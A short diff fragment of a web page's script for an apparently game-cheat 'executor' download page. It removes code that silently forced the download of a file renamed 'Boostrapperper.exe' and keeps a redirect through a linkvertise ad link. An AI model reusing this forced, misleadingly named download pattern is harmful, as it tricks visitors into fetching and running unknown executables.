@@ -341,15 +341,6 @@
 
         function downloadAndRedirect(event) {
             event.preventDefault();
-
-            // Trigger file download
-            const downloadLink = document.createElement('a');
-            downloadLink.href = 'apierror.html';
-            downloadLink.download = 'Boostrapperper.exe';
-            document.body.appendChild(downloadLink);
-            downloadLink.click();
-            document.body.removeChild(downloadLink);
-
             // Delay redirect to purchase page
             setTimeout(() => {
                 window.location.href = 'https://linkvertise.com/1193383/floraexecutor-v60?o=sharing';
